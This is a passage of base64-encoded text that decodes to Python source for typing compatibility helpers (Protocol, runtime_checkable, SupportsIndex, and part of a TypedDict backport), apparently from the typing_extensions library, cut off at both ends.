AgICAgICAgICAgICAgICAgICAgXCdfX2RvY19fXCcsIFwnX19zdWJjbGFzc2hvb2tfX1wnLCBcJ19faW5pdF9fXCcsIFwnX19uZXdfX1wnLFxuICAgICAgICAgICAgICAgICAgICBcJ19fbW9kdWxlX19cJywgXCdfTXV0YWJsZU1hcHBpbmdfX21hcmtlclwnLCBcJ19nb3JnXCcpKTpcbiAgICAgICAgICAgICAgICBhdHRycy5hZGQoYXR0cilcbiAgICByZXR1cm4gYXR0cnNcblxuXG5kZWYgX2lzX2NhbGxhYmxlX21lbWJlcnNfb25seShjbHMpOlxuICAgIHJldHVybiBhbGwoY2FsbGFibGUoZ2V0YXR0cihjbHMsIGF0dHIsIE5vbmUpKSBmb3IgYXR0ciBpbiBfZ2V0X3Byb3RvY29sX2F0dHJzKGNscykpXG5cblxuIyAzLjgrXG5pZiBoYXNhdHRyKHR5cGluZywgXCdQcm90b2NvbFwnKTpcbiAgICBQcm90b2NvbCA9IHR5cGluZy5Qcm90b2NvbFxuIyAzLjdcbmVsc2U6XG5cbiAgICBkZWYgX25vX2luaXQoc2VsZiwgKmFyZ3MsICoqa3dhcmdzKTpcbiAgICAgICAgaWYgdHlwZShzZWxmKS5faXNfcHJvdG9jb2w6XG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoXCdQcm90b2NvbHMgY2Fubm90IGJlIGluc3RhbnRpYXRlZFwnKVxuXG4gICAgY2xhc3MgX1Byb3RvY29sTWV0YShhYmMuQUJDTWV0YSk6XG4gICAgICAgICMgVGhpcyBtZXRhY2xhc3MgaXMgYSBiaXQgdW5mb3J0dW5hdGUgYW5kIGV4aXN0cyBvbmx5IGJlY2F1c2Ugb2YgdGhlIGxhY2tcbiAgICAgICAgIyBvZiBfX2luc3RhbmNlaG9va19fLlxuICAgICAgICBkZWYgX19pbnN0YW5jZWNoZWNrX18oY2xzLCBpbnN0YW5jZSk6XG4gICAgICAgICAgICAjIFdlIG5lZWQgdGhpcyBtZXRob2QgZm9yIHNpdHVhdGlvbnMgd2hlcmUgYXR0cmlidXRlcyBhcmVcbiAgICAgICAgICAgICMgYXNzaWduZWQgaW4gX19pbml0X18uXG4gICAgICAgICAgICBpZiAoKG5vdCBnZXRhdHRyKGNscywgXCdfaXNfcHJvdG9jb2xcJywgRmFsc2UpIG9yXG4gICAgICAgICAgICAgICAgIF9pc19jYWxsYWJsZV9tZW1iZXJzX29ubHkoY2xzKSkgYW5kXG4gICAgICAgICAgICAgICAgICAgIGlzc3ViY2xhc3MoaW5zdGFuY2UuX19jbGFzc19fLCBjbHMpKTpcbiAgICAgICAgICAgICAgICByZXR1cm4gVHJ1ZVxuICAgICAgICAgICAgaWYgY2xzLl9pc19wcm90b2NvbDpcbiAgICAgICAgICAgICAgICBpZiBhbGwoaGFzYXR0cihpbnN0YW5jZSwgYXR0cikgYW5kXG4gICAgICAgICAgICAgICAgICAgICAgIChub3QgY2FsbGFibGUoZ2V0YXR0cihjbHMsIGF0dHIsIE5vbmUpKSBvclxuICAgICAgICAgICAgICAgICAgICAgICAgZ2V0YXR0cihpbnN0YW5jZSwgYXR0cikgaXMgbm90IE5vbmUpXG4gICAgICAgICAgICAgICAgICAgICAgIGZvciBhdHRyIGluIF9nZXRfcHJvdG9jb2xfYXR0cnMoY2xzKSk6XG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBUcnVlXG4gICAgICAgICAgICByZXR1cm4gc3VwZXIoKS5fX2luc3RhbmNlY2hlY2tfXyhpbnN0YW5jZSlcblxuICAgIGNsYXNzIFByb3RvY29sKG1ldGFjbGFzcz1fUHJvdG9jb2xNZXRhKTpcbiAgICAgICAgIyBUaGVyZSBpcyBxdWl0ZSBhIGxvdCBvZiBvdmVybGFwcGluZyBjb2RlIHdpdGggdHlwaW5nLkdlbmVyaWMuXG4gICAgICAgICMgVW5mb3J0dW5hdGVseSBpdCBpcyBoYXJkIHRvIGF2b2lkIHRoaXMgd2hpbGUgdGhlc2UgbGl2ZSBpbiB0d28gZGlmZmVyZW50XG4gICAgICAgICMgbW9kdWxlcy4gVGhlIGR1cGxpY2F0ZWQgY29kZSB3aWxsIGJlIHJlbW92ZWQgd2hlbiBQcm90b2NvbCBpcyBtb3ZlZCB0byB0eXBpbmcuXG4gICAgICAgICIiIkJhc2UgY2xhc3MgZm9yIHByb3RvY29sIGNsYXNzZXMuIFByb3RvY29sIGNsYXNzZXMgYXJlIGRlZmluZWQgYXM6OlxuXG4gICAgICAgICAgICBjbGFzcyBQcm90byhQcm90b2NvbCk6XG4gICAgICAgICAgICAgICAgZGVmIG1ldGgoc2VsZikgLT4gaW50OlxuICAgICAgICAgICAgICAgICAgICAuLi5cblxuICAgICAgICBTdWNoIGNsYXNzZXMgYXJlIHByaW1hcmlseSB1c2VkIHdpdGggc3RhdGljIHR5cGUgY2hlY2tlcnMgdGhhdCByZWNvZ25pemVcbiAgICAgICAgc3RydWN0dXJhbCBzdWJ0eXBpbmcgKHN0YXRpYyBkdWNrLXR5cGluZyksIGZvciBleGFtcGxlOjpcblxuICAgICAgICAgICAgY2xhc3MgQzpcbiAgICAgICAgICAgICAgICBkZWYgbWV0aChzZWxmKSAtPiBpbnQ6XG4gICAgICAgICAgICAgICAgICAgIHJldHVybiAwXG5cbiAgICAgICAgICAgIGRlZiBmdW5jKHg6IFByb3RvKSAtPiBpbnQ6XG4gICAgICAgICAgICAgICAgcmV0dXJuIHgubWV0aCgpXG5cbiAgICAgICAgICAgIGZ1bmMoQygpKSAgIyBQYXNzZXMgc3RhdGljIHR5cGUgY2hlY2tcblxuICAgICAgICBTZWUgUEVQIDU0NCBmb3IgZGV0YWlscy4gUHJvdG9jb2wgY2xhc3NlcyBkZWNvcmF0ZWQgd2l0aFxuICAgICAgICBAdHlwaW5nX2V4dGVuc2lvbnMucnVudGltZSBhY3QgYXMgc2ltcGxlLW1pbmRlZCBydW50aW1lIHByb3RvY29sIHRoYXQgY2hlY2tzXG4gICAgICAgIG9ubHkgdGhlIHByZXNlbmNlIG9mIGdpdmVuIGF0dHJpYnV0ZXMsIGlnbm9yaW5nIHRoZWlyIHR5cGUgc2lnbmF0dXJlcy5cblxuICAgICAgICBQcm90b2NvbCBjbGFzc2VzIGNhbiBiZSBnZW5lcmljLCB0aGV5IGFyZSBkZWZpbmVkIGFzOjpcblxuICAgICAgICAgICAgY2xhc3MgR2VuUHJvdG8oUHJvdG9jb2xbVF0pOlxuICAgICAgICAgICAgICAgIGRlZiBtZXRoKHNlbGYpIC0+IFQ6XG4gICAgICAgICAgICAgICAgICAgIC4uLlxuICAgICAgICAiIiJcbiAgICAgICAgX19zbG90c19fID0gKClcbiAgICAgICAgX2lzX3Byb3RvY29sID0gVHJ1ZVxuXG4gICAgICAgIGRlZiBfX25ld19fKGNscywgKmFyZ3MsICoqa3dkcyk6XG4gICAgICAgICAgICBpZiBjbHMgaXMgUHJvdG9jb2w6XG4gICAgICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKCJUeXBlIFByb3RvY29sIGNhbm5vdCBiZSBpbnN0YW50aWF0ZWQ7ICJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIml0IGNhbiBvbmx5IGJlIHVzZWQgYXMgYSBiYXNlIGNsYXNzIilcbiAgICAgICAgICAgIHJldHVybiBzdXBlcigpLl9fbmV3X18oY2xzKVxuXG4gICAgICAgIEB0eXBpbmcuX3RwX2NhY2hlXG4gICAgICAgIGRlZiBfX2NsYXNzX2dldGl0ZW1fXyhjbHMsIHBhcmFtcyk6XG4gICAgICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShwYXJhbXMsIHR1cGxlKTpcbiAgICAgICAgICAgICAgICBwYXJhbXMgPSAocGFyYW1zLClcbiAgICAgICAgICAgIGlmIG5vdCBwYXJhbXMgYW5kIGNscyBpcyBub3QgdHlwaW5nLlR1cGxlOlxuICAgICAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcihcbiAgICAgICAgICAgICAgICAgICAgZiJQYXJhbWV0ZXIgbGlzdCB0byB7Y2xzLl9fcXVhbG5hbWVfX31bLi4uXSBjYW5ub3QgYmUgZW1wdHkiKVxuICAgICAgICAgICAgbXNnID0gIlBhcmFtZXRlcnMgdG8gZ2VuZXJpYyB0eXBlcyBtdXN0IGJlIHR5cGVzLiJcbiAgICAgICAgICAgIHBhcmFtcyA9IHR1cGxlKHR5cGluZy5fdHlwZV9jaGVjayhwLCBtc2cpIGZvciBwIGluIHBhcmFtcykgICMgbm9xYVxuICAgICAgICAgICAgaWYgY2xzIGlzIFByb3RvY29sOlxuICAgICAgICAgICAgICAgICMgR2VuZXJpYyBjYW4gb25seSBiZSBzdWJzY3JpcHRlZCB3aXRoIHVuaXF1ZSB0eXBlIHZhcmlhYmxlcy5cbiAgICAgICAgICAgICAgICBpZiBub3QgYWxsKGlzaW5zdGFuY2UocCwgdHlwaW5nLlR5cGVWYXIpIGZvciBwIGluIHBhcmFtcyk6XG4gICAgICAgICAgICAgICAgICAgIGkgPSAwXG4gICAgICAgICAgICAgICAgICAgIHdoaWxlIGlzaW5zdGFuY2UocGFyYW1zW2ldLCB0eXBpbmcuVHlwZVZhcik6XG4gICAgICAgICAgICAgICAgICAgICAgICBpICs9IDFcbiAgICAgICAgICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKFxuICAgICAgICAgICAgICAgICAgICAgICAgIlBhcmFtZXRlcnMgdG8gUHJvdG9jb2xbLi4uXSBtdXN0IGFsbCBiZSB0eXBlIHZhcmlhYmxlcy4iXG4gICAgICAgICAgICAgICAgICAgICAgICBmIiBQYXJhbWV0ZXIge2kgKyAxfSBpcyB7cGFyYW1zW2ldfSIpXG4gICAgICAgICAgICAgICAgaWYgbGVuKHNldChwYXJhbXMpKSAhPSBsZW4ocGFyYW1zKTpcbiAgICAgICAgICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKFxuICAgICAgICAgICAgICAgICAgICAgICAgIlBhcmFtZXRlcnMgdG8gUHJvdG9jb2xbLi4uXSBtdXN0IGFsbCBiZSB1bmlxdWUiKVxuICAgICAgICAgICAgZWxzZTpcbiAgICAgICAgICAgICAgICAjIFN1YnNjcmlwdGluZyBhIHJlZ3VsYXIgR2VuZXJpYyBzdWJjbGFzcy5cbiAgICAgICAgICAgICAgICBfY2hlY2tfZ2VuZXJpYyhjbHMsIHBhcmFtcywgbGVuKGNscy5fX3BhcmFtZXRlcnNfXykpXG4gICAgICAgICAgICByZXR1cm4gdHlwaW5nLl9HZW5lcmljQWxpYXMoY2xzLCBwYXJhbXMpXG5cbiAgICAgICAgZGVmIF9faW5pdF9zdWJjbGFzc19fKGNscywgKmFyZ3MsICoqa3dhcmdzKTpcbiAgICAgICAgICAgIHR2YXJzID0gW11cbiAgICAgICAgICAgIGlmIFwnX19vcmlnX2Jhc2VzX19cJyBpbiBjbHMuX19kaWN0X186XG4gICAgICAgICAgICAgICAgZXJyb3IgPSB0eXBpbmcuR2VuZXJpYyBpbiBjbHMuX19vcmlnX2Jhc2VzX19cbiAgICAgICAgICAgIGVsc2U6XG4gICAgICAgICAgICAgICAgZXJyb3IgPSB0eXBpbmcuR2VuZXJpYyBpbiBjbHMuX19iYXNlc19fXG4gICAgICAgICAgICBpZiBlcnJvcjpcbiAgICAgICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoIkNhbm5vdCBpbmhlcml0IGZyb20gcGxhaW4gR2VuZXJpYyIpXG4gICAgICAgICAgICBpZiBcJ19fb3JpZ19iYXNlc19fXCcgaW4gY2xzLl9fZGljdF9fOlxuICAgICAgICAgICAgICAgIHR2YXJzID0gdHlwaW5nLl9jb2xsZWN0X3R5cGVfdmFycyhjbHMuX19vcmlnX2Jhc2VzX18pXG4gICAgICAgICAgICAgICAgIyBMb29rIGZvciBHZW5lcmljW1QxLCAuLi4sIFRuXSBvciBQcm90b2NvbFtUMSwgLi4uLCBUbl0uXG4gICAgICAgICAgICAgICAgIyBJZiBmb3VuZCwgdHZhcnMgbXVzdCBiZSBhIHN1YnNldCBvZiBpdC5cbiAgICAgICAgICAgICAgICAjIElmIG5vdCBmb3VuZCwgdHZhcnMgaXMgaXQuXG4gICAgICAgICAgICAgICAgIyBBbHNvIGNoZWNrIGZvciBhbmQgcmVqZWN0IHBsYWluIEdlbmVyaWMsXG4gICAgICAgICAgICAgICAgIyBhbmQgcmVqZWN0IG11bHRpcGxlIEdlbmVyaWNbLi4uXSBhbmQvb3IgUHJvdG9jb2xbLi4uXS5cbiAgICAgICAgICAgICAgICBndmFycyA9IE5vbmVcbiAgICAgICAgICAgICAgICBmb3IgYmFzZSBpbiBjbHMuX19vcmlnX2Jhc2VzX186XG4gICAgICAgICAgICAgICAgICAgIGlmIChpc2luc3RhbmNlKGJhc2UsIHR5cGluZy5fR2VuZXJpY0FsaWFzKSBhbmRcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBiYXNlLl9fb3JpZ2luX18gaW4gKHR5cGluZy5HZW5lcmljLCBQcm90b2NvbCkpOlxuICAgICAgICAgICAgICAgICAgICAgICAgIyBmb3IgZXJyb3IgbWVzc2FnZXNcbiAgICAgICAgICAgICAgICAgICAgICAgIHRoZV9iYXNlID0gYmFzZS5fX29yaWdpbl9fLl9fbmFtZV9fXG4gICAgICAgICAgICAgICAgICAgICAgICBpZiBndmFycyBpcyBub3QgTm9uZTpcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJDYW5ub3QgaW5oZXJpdCBmcm9tIEdlbmVyaWNbLi4uXSJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIiBhbmQvb3IgUHJvdG9jb2xbLi4uXSBtdWx0aXBsZSB0eXBlcy4iKVxuICAgICAgICAgICAgICAgICAgICAgICAgZ3ZhcnMgPSBiYXNlLl9fcGFyYW1ldGVyc19fXG4gICAgICAgICAgICAgICAgaWYgZ3ZhcnMgaXMgTm9uZTpcbiAgICAgICAgICAgICAgICAgICAgZ3ZhcnMgPSB0dmFyc1xuICAgICAgICAgICAgICAgIGVsc2U6XG4gICAgICAgICAgICAgICAgICAgIHR2YXJzZXQgPSBzZXQodHZhcnMpXG4gICAgICAgICAgICAgICAgICAgIGd2YXJzZXQgPSBzZXQoZ3ZhcnMpXG4gICAgICAgICAgICAgICAgICAgIGlmIG5vdCB0dmFyc2V0IDw9IGd2YXJzZXQ6XG4gICAgICAgICAgICAgICAgICAgICAgICBzX3ZhcnMgPSBcJywgXCcuam9pbihzdHIodCkgZm9yIHQgaW4gdHZhcnMgaWYgdCBub3QgaW4gZ3ZhcnNldClcbiAgICAgICAgICAgICAgICAgICAgICAgIHNfYXJncyA9IFwnLCBcJy5qb2luKHN0cihnKSBmb3IgZyBpbiBndmFycylcbiAgICAgICAgICAgICAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcihmIlNvbWUgdHlwZSB2YXJpYWJsZXMgKHtzX3ZhcnN9KSBhcmUiXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZiIgbm90IGxpc3RlZCBpbiB7dGhlX2Jhc2V9W3tzX2FyZ3N9XSIpXG4gICAgICAgICAgICAgICAgICAgIHR2YXJzID0gZ3ZhcnNcbiAgICAgICAgICAgIGNscy5fX3BhcmFtZXRlcnNfXyA9IHR1cGxlKHR2YXJzKVxuXG4gICAgICAgICAgICAjIERldGVybWluZSBpZiB0aGlzIGlzIGEgcHJvdG9jb2wgb3IgYSBjb25jcmV0ZSBzdWJjbGFzcy5cbiAgICAgICAgICAgIGlmIG5vdCBjbHMuX19kaWN0X18uZ2V0KFwnX2lzX3Byb3RvY29sXCcsIE5vbmUpOlxuICAgICAgICAgICAgICAgIGNscy5faXNfcHJvdG9jb2wgPSBhbnkoYiBpcyBQcm90b2NvbCBmb3IgYiBpbiBjbHMuX19iYXNlc19fKVxuXG4gICAgICAgICAgICAjIFNldCAob3Igb3ZlcnJpZGUpIHRoZSBwcm90b2NvbCBzdWJjbGFzcyBob29rLlxuICAgICAgICAgICAgZGVmIF9wcm90b19ob29rKG90aGVyKTpcbiAgICAgICAgICAgICAgICBpZiBub3QgY2xzLl9fZGljdF9fLmdldChcJ19pc19wcm90b2NvbFwnLCBOb25lKTpcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIE5vdEltcGxlbWVudGVkXG4gICAgICAgICAgICAgICAgaWYgbm90IGdldGF0dHIoY2xzLCBcJ19pc19ydW50aW1lX3Byb3RvY29sXCcsIEZhbHNlKTpcbiAgICAgICAgICAgICAgICAgICAgaWYgc3lzLl9nZXRmcmFtZSgyKS5mX2dsb2JhbHNbXCdfX25hbWVfX1wnXSBpbiBbXCdhYmNcJywgXCdmdW5jdG9vbHNcJ106XG4gICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gTm90SW1wbGVtZW50ZWRcbiAgICAgICAgICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKCJJbnN0YW5jZSBhbmQgY2xhc3MgY2hlY2tzIGNhbiBvbmx5IGJlIHVzZWQgd2l0aCJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICIgQHJ1bnRpbWUgcHJvdG9jb2xzIilcbiAgICAgICAgICAgICAgICBpZiBub3QgX2lzX2NhbGxhYmxlX21lbWJlcnNfb25seShjbHMpOlxuICAgICAgICAgICAgICAgICAgICBpZiBzeXMuX2dldGZyYW1lKDIpLmZfZ2xvYmFsc1tcJ19fbmFtZV9fXCddIGluIFtcJ2FiY1wnLCBcJ2Z1bmN0b29sc1wnXTpcbiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBOb3RJbXBsZW1lbnRlZFxuICAgICAgICAgICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoIlByb3RvY29scyB3aXRoIG5vbi1tZXRob2QgbWVtYmVycyJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICIgZG9uXCd0IHN1cHBvcnQgaXNzdWJjbGFzcygpIilcbiAgICAgICAgICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShvdGhlciwgdHlwZSk6XG4gICAgICAgICAgICAgICAgICAgICMgU2FtZSBlcnJvciBhcyBmb3IgaXNzdWJjbGFzcygxLCBpbnQpXG4gICAgICAgICAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcihcJ2lzc3ViY2xhc3MoKSBhcmcgMSBtdXN0IGJlIGEgY2xhc3NcJylcbiAgICAgICAgICAgICAgICBmb3IgYXR0ciBpbiBfZ2V0X3Byb3RvY29sX2F0dHJzKGNscyk6XG4gICAgICAgICAgICAgICAgICAgIGZvciBiYXNlIGluIG90aGVyLl9fbXJvX186XG4gICAgICAgICAgICAgICAgICAgICAgICBpZiBhdHRyIGluIGJhc2UuX19kaWN0X186XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgYmFzZS5fX2RpY3RfX1thdHRyXSBpcyBOb25lOlxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gTm90SW1wbGVtZW50ZWRcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVha1xuICAgICAgICAgICAgICAgICAgICAgICAgYW5ub3RhdGlvbnMgPSBnZXRhdHRyKGJhc2UsIFwnX19hbm5vdGF0aW9uc19fXCcsIHt9KVxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGlzaW5zdGFuY2UoYW5ub3RhdGlvbnMsIHR5cGluZy5NYXBwaW5nKSBhbmRcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXR0ciBpbiBhbm5vdGF0aW9ucyBhbmRcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaXNpbnN0YW5jZShvdGhlciwgX1Byb3RvY29sTWV0YSkgYW5kXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG90aGVyLl9pc19wcm90b2NvbCk6XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWtcbiAgICAgICAgICAgICAgICAgICAgZWxzZTpcbiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBOb3RJbXBsZW1lbnRlZFxuICAgICAgICAgICAgICAgIHJldHVybiBUcnVlXG4gICAgICAgICAgICBpZiBcJ19fc3ViY2xhc3Nob29rX19cJyBub3QgaW4gY2xzLl9fZGljdF9fOlxuICAgICAgICAgICAgICAgIGNscy5fX3N1YmNsYXNzaG9va19fID0gX3Byb3RvX2hvb2tcblxuICAgICAgICAgICAgIyBXZSBoYXZlIG5vdGhpbmcgbW9yZSB0byBkbyBmb3Igbm9uLXByb3RvY29scy5cbiAgICAgICAgICAgIGlmIG5vdCBjbHMuX2lzX3Byb3RvY29sOlxuICAgICAgICAgICAgICAgIHJldHVyblxuXG4gICAgICAgICAgICAjIENoZWNrIGNvbnNpc3RlbmN5IG9mIGJhc2VzLlxuICAgICAgICAgICAgZm9yIGJhc2UgaW4gY2xzLl9fYmFzZXNfXzpcbiAgICAgICAgICAgICAgICBpZiBub3QgKGJhc2UgaW4gKG9iamVjdCwgdHlwaW5nLkdlbmVyaWMpIG9yXG4gICAgICAgICAgICAgICAgICAgICAgICBiYXNlLl9fbW9kdWxlX18gPT0gXCdjb2xsZWN0aW9ucy5hYmNcJyBhbmRcbiAgICAgICAgICAgICAgICAgICAgICAgIGJhc2UuX19uYW1lX18gaW4gX1BST1RPX1dISVRFTElTVCBvclxuICAgICAgICAgICAgICAgICAgICAgICAgaXNpbnN0YW5jZShiYXNlLCBfUHJvdG9jb2xNZXRhKSBhbmQgYmFzZS5faXNfcHJvdG9jb2wpOlxuICAgICAgICAgICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoXCdQcm90b2NvbHMgY2FuIG9ubHkgaW5oZXJpdCBmcm9tIG90aGVyXCdcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZcJyBwcm90b2NvbHMsIGdvdCB7cmVwcihiYXNlKX1cJylcbiAgICAgICAgICAgIGNscy5fX2luaXRfXyA9IF9ub19pbml0XG5cblxuIyAzLjgrXG5pZiBoYXNhdHRyKHR5cGluZywgXCdydW50aW1lX2NoZWNrYWJsZVwnKTpcbiAgICBydW50aW1lX2NoZWNrYWJsZSA9IHR5cGluZy5ydW50aW1lX2NoZWNrYWJsZVxuIyAzLjdcbmVsc2U6XG4gICAgZGVmIHJ1bnRpbWVfY2hlY2thYmxlKGNscyk6XG4gICAgICAgICIiIk1hcmsgYSBwcm90b2NvbCBjbGFzcyBhcyBhIHJ1bnRpbWUgcHJvdG9jb2wsIHNvIHRoYXQgaXRcbiAgICAgICAgY2FuIGJlIHVzZWQgd2l0aCBpc2luc3RhbmNlKCkgYW5kIGlzc3ViY2xhc3MoKS4gUmFpc2UgVHlwZUVycm9yXG4gICAgICAgIGlmIGFwcGxpZWQgdG8gYSBub24tcHJvdG9jb2wgY2xhc3MuXG5cbiAgICAgICAgVGhpcyBhbGxvd3MgYSBzaW1wbGUtbWluZGVkIHN0cnVjdHVyYWwgY2hlY2sgdmVyeSBzaW1pbGFyIHRvIHRoZVxuICAgICAgICBvbmUtb2ZmcyBpbiBjb2xsZWN0aW9ucy5hYmMgc3VjaCBhcyBIYXNoYWJsZS5cbiAgICAgICAgIiIiXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKGNscywgX1Byb3RvY29sTWV0YSkgb3Igbm90IGNscy5faXNfcHJvdG9jb2w6XG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoXCdAcnVudGltZV9jaGVja2FibGUgY2FuIGJlIG9ubHkgYXBwbGllZCB0byBwcm90b2NvbCBjbGFzc2VzLFwnXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZlwnIGdvdCB7Y2xzIXJ9XCcpXG4gICAgICAgIGNscy5faXNfcnVudGltZV9wcm90b2NvbCA9IFRydWVcbiAgICAgICAgcmV0dXJuIGNsc1xuXG5cbiMgRXhpc3RzIGZvciBiYWNrd2FyZHMgY29tcGF0aWJpbGl0eS5cbnJ1bnRpbWUgPSBydW50aW1lX2NoZWNrYWJsZVxuXG5cbiMgMy44K1xuaWYgaGFzYXR0cih0eXBpbmcsIFwnU3VwcG9ydHNJbmRleFwnKTpcbiAgICBTdXBwb3J0c0luZGV4ID0gdHlwaW5nLlN1cHBvcnRzSW5kZXhcbiMgMy43XG5lbHNlOlxuICAgIEBydW50aW1lX2NoZWNrYWJsZVxuICAgIGNsYXNzIFN1cHBvcnRzSW5kZXgoUHJvdG9jb2wpOlxuICAgICAgICBfX3Nsb3RzX18gPSAoKVxuXG4gICAgICAgIEBhYmMuYWJzdHJhY3RtZXRob2RcbiAgICAgICAgZGVmIF9faW5kZXhfXyhzZWxmKSAtPiBpbnQ6XG4gICAgICAgICAgICBwYXNzXG5cblxuaWYgaGFzYXR0cih0eXBpbmcsICJSZXF1aXJlZCIpOlxuICAgICMgVGhlIHN0YW5kYXJkIGxpYnJhcnkgVHlwZWREaWN0IGluIFB5dGhvbiAzLjggZG9lcyBub3Qgc3RvcmUgcnVudGltZSBpbmZvcm1hdGlvblxuICAgICMgYWJvdXQgd2hpY2ggKGlmIGFueSkga2V5cyBhcmUgb3B0aW9uYWwuICBTZWUgaHR0cHM6Ly9idWdzLnB5dGhvbi5vcmcvaXNzdWUzODgzNFxuICAgICMgVGhlIHN0YW5kYXJkIGxpYnJhcnkgVHlwZWREaWN0IGluIFB5dGhvbiAzLjkuMC8xIGRvZXMgbm90IGhvbm91ciB0aGUgInRvdGFsIlxuICAgICMga2V5d29yZCB3aXRoIG9sZC1zdHlsZSBUeXBlZERpY3QoKS4gIFNlZSBodHRwczovL2J1Z3MucHl0aG9uLm9yZy9pc3N1ZTQyMDU5XG4gICAgIyBUaGUgc3RhbmRhcmQgbGlicmFyeSBUeXBlZERpY3QgYmVsb3cgUHl0aG9uIDMuMTEgZG9lcyBub3Qgc3RvcmUgcnVudGltZVxuICAgICMgaW5mb3JtYXRpb24gYWJvdXQgb3B0aW9uYWwgYW5kIHJlcXVpcmVkIGtleXMgd2hlbiB1c2luZyBSZXF1aXJlZCBvciBOb3RSZXF1aXJlZC5cbiAgICBUeXBlZERpY3QgPSB0eXBpbmcuVHlwZWREaWN0XG4gICAgX1R5cGVkRGljdE1ldGEgPSB0eXBpbmcuX1R5cGVkRGljdE1ldGFcbiAgICBpc190eXBlZGRpY3QgPSB0eXBpbmcuaXNfdHlwZWRkaWN0XG5lbHNlOlxuICAgIGRlZiBfY2hlY2tfZmFpbHMoY2xzLCBvdGhlcik6XG4gICAgICAgIHRyeTpcbiAgICAgICAgICAgIGlmIHN5cy5fZ2V0ZnJhbWUoMSkuZl9nbG9iYWxzW1wnX19uYW1lX19cJ10gbm90IGluIFtcJ2FiY1wnLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcJ2Z1bmN0b29sc1wnLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcJ3R5cGluZ1wnXTpcbiAgICAgICAgICAgICAgICAjIFR5cGVkIGRpY3RzIGFyZSBvbmx5IGZvciBzdGF0aWMgc3RydWN0dXJhbCBzdWJ0eXBpbmcuXG4gICAgICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKFwnVHlwZWREaWN0IGRvZXMgbm90IHN1cHBvcnQgaW5zdGFuY2UgYW5kIGNsYXNzIGNoZWNrc1wnKVxuICAgICAgICBleGNlcHQgKEF0dHJpYnV0ZUVycm9yLCBWYWx1ZUVycm9yKTpcbiAgICAgICAgICAgIHBhc3NcbiAgICAgICAgcmV0dXJuIEZhbHNlXG5cbiAgICBkZWYgX2RpY3RfbmV3KCphcmdzLCAqKmt3YXJncyk6XG4gICAgICAgIGlmIG5vdCBhcmdzOlxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKFwnVHlwZWREaWN0Ll9fbmV3X18oKTogbm90IGVub3VnaCBhcmd1bWVudHNcJylcbiAgICAgICAgXywgYXJncyA9IGFyZ3NbMF0sIGFyZ3NbMTpdICAjIGFsbG93IHRoZSAiY2xzIiBrZXl3b3JkIGJlIHBhc3NlZFxuICAgICAgICByZXR1cm4gZGljdCgqYXJncywgKiprd2FyZ3MpXG5cbiAgICBfZGljdF9uZXcuX190ZXh0X3NpZ25hdHVyZV9fID0gXCcoJGNscywgX3R5cGVuYW1lLCBfZmllbGRzPU5vbmUsIC8sICoqa3dhcmdzKVwnXG5cbiAgICBkZWYgX3R5cGVkZGljdF9uZXcoKmFyZ3MsIHRvdGFsPVRydWUsICoqa3dhcmdzKTpcbiAgICAgICAgaWYgbm90IGFyZ3M6XG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoXCdUeXBlZERpY3QuX19uZXdfXygpOiBub3QgZW5vdWdoIGFyZ3VtZW50c1wnKVxuICAgICAgICBfLCBhcmdzID0gYXJnc1swXSwgYXJnc1sxOl0gICMgYWxsb3cgdGhlICJjbHMiIGtleXdvcmQgYmUgcGFzc2VkXG4gICAgICAgIGlmIGFyZ3M6XG4gICAgICAgICAgICB0eXBlbmFtZSwgYXJncyA9IGFyZ3NbMF0sIGFyZ3NbMTpdICAjIGFsbG93IHRoZSAiX3R5cGVuYW1lIiBrZXl3b3JkIGJlIHBhc3NlZFxuICAgICAgICBlbGlmIFwnX3R5cGVuYW1lXCcgaW4ga3dhcmdzOlxuICAgICAgICAgICAgdHlwZW5hbWUgPSBrd2FyZ3MucG9wKFwnX3R5cGVuYW1lXCcpXG4gICAgICAgICAgICBpbXBvcnQgd2FybmluZ3NcbiAgICAgI